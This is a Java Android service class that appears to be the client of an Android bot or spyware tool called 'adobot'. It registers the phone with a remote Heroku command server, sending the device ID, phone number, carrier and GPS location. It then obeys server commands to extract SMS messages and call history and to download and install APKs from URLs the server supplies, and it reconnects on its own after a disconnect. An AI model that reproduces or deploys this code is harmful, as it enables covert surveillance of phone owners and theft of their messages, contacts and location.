package buddy.ap.com.adobot;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.BuildConfig;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.HashMap;

import http.Http;
import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class Client extends Service {

    private static final String TAG = "Client";

    public static String SERVER;
    private static final String POST_STATUS = "/status";

    private Client client;
    private Socket socket;
    private boolean connected;
    private boolean registered;
    private String uid;
    private String device;
    private String sdk;
    private String provider;
    private String phone;
    private int version;
    private double latitude;
    private double longitude;

    public Socket getSocket() {
        return socket;
    }

    public String getUid() {
        return uid;
    }

    public String getDevice() {
        return device;
    }

    public String getSdk() {
        return sdk;
    }

    public String getProvider() {
        return provider;
    }

    public String getPhone() {
        return phone;
    }

    public int getVersion() {
        return version;
    }

    public double getLatitude() {
        return latitude;
    }

    public double getLongitude() {
        return longitude;
    }

    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            updateLocation(location);
        }

        public void onProviderDisabled(String provider) {
            updateLocation(null);
        }

        public void onProviderEnabled(String provider) {
        }

        public void onStatusChanged(String provider, int status, Bundle extras) {
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {

        SERVER = buddy.ap.com.adobot.BuildConfig.DEBUG ? "http://192.168.1.251:3000" : "https://obscure-escarpment-69091.herokuapp.com";

        client = this;
        connected = false;
        uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        device = android.os.Build.MODEL;
        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString(); //Build.VERSION.RELEASE;
        version = 1;
        phone = "";

        TelephonyManager telephonyManager = ((TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
        provider = telephonyManager.getNetworkOperatorName();
        if (ContextCompat.checkSelfPermission(client, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            phone = telephonyManager.getLine1Number();
        }

        latitude = 0;
        longitude = 0;

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 400, 1, locationListener);
            Location location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                latitude = location.getLatitude();
                longitude = location.getLongitude();
                Log.i(TAG, "Location Is Live = (" + latitude + "," + longitude + ")");
            }
        }
        try {
            socket = IO.socket(SERVER);
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {

                    Log.i(TAG, "\n\nSocket connected\n\n");
                    connected = true;

                    HashMap bot = new HashMap();
                    bot.put("uid", uid);
                    bot.put("provider", provider);
                    bot.put("lat", latitude);
                    bot.put("longi", longitude);
                    bot.put("device", device);
                    bot.put("sdk", sdk);
                    bot.put("version", version);
                    bot.put("phone", phone);

                    JSONObject obj = new JSONObject(bot);
                    socket.emit("register", obj, new Ack() {
                        @Override
                        public void call(Object... args) {
                            registered = true;
                            Log.i(TAG, "Socket connected");
                        }
                    });

                }

            });

            socket.on("commands", new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    JSONArray cmds = (JSONArray) args[0];
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject cmd = new JSONObject();
                        try {
                            cmd = (JSONObject) cmds.get(i);

                            String command = (String) cmd.get("command");
                            Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");

                            if (command.equals("getsms")) {
                                Log.i(TAG, "\nInvoking Sms Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                SmsService smsService = new SmsService(client, arg1);
                                smsService.start();
                            } else if (command.equals("getcallhistory")) {
                                Log.i(TAG, "\nInvoking Call LOg Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                CallLogService cs = new CallLogService(client, arg1);
                                cs.start();
                            } else if (command.equals("promptupdate")) {
                                Log.i(TAG, "\nInvoking UpdateApp\n");
                                String apkUrl = cmd.get("arg1").toString();

                                UpdateApp atualizaApp = new UpdateApp();
                                atualizaApp.setClient(client);
                                atualizaApp.execute(apkUrl);
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }

            });

            socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    connected = false;
                    Log.i(TAG, "\n\nSocket disconnected...\n\n");
                    final Thread reconnect = new Thread() {
                        @Override
                        public void run() {
                            super.run();
                            try {
                                Thread.sleep(10000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            Log.i(TAG, "Socket reconnecting after being disconnected..");

                            if (!connected)
                                socket.connect();
                        }
                    };
                    reconnect.start();
                }

            });

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

        super.onCreate();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Running onStartCommand");

//        socket.connect();

        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
        if (!connected) {
            Log.i(TAG, "Socket is connecting ......\n");
            socket.connect();
        }

        super.onStartCommand(intent, flags, startId);
        return START_STICKY;

    }

    private void updateLocation(Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();

            Log.i(TAG, "Location changed ....");

            HashMap bot = new HashMap();
            bot.put("uid", uid);
            bot.put("provider", provider);
            bot.put("lat", latitude);
            bot.put("longi", longitude);
            bot.put("device", device);
            bot.put("sdk", sdk);
            bot.put("version", version);
            bot.put("phone", phone);
            Http req = new Http();
            req.setUrl(SERVER + POST_STATUS + "/" + uid);
            req.setMethod("POST");
            req.setParams(bot);
            req.execute();
        }
    }


    public String getContactName(Context context, String phoneNumber) {
        // check permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = context.getContentResolver();
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
            Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor == null) {
                return null;
            }
            String contactName = null;
            if (cursor.moveToFirst()) {
                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }

            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }

            return contactName;
        } else {
            return "";
        }
    }

    @Override
    public void onDestroy() {
//        Intent in = new Intent();
//        in.setAction("RestartAdoBotService");
//        super.onDestroy();
        Log.i(TAG, "Service was destroyed!!!");
    }
}
